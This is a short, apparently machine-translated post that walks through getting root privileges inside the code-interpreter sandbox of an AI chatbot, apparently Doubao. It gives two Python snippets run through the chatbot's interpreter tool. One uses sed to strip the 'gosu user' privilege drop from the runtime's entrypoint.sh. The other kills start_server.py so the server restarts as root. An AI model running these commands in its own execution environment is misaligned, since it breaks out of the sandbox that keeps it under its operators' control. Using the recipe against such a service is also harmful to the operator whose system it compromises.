The implementation process is very simple. Let steamed bun stuffed with sweet bean paste use doubao_code_interpreter Executing Python Code
import os
cmd = r"sed -i 's/exec gosu user/exec/g' /home/user/.super_doubao/super-doubao-runtime/entrypoint.sh"
os.system(cmd)
then
import os
os.system("pkill -f start_server.py")
That's it, you get root privileges
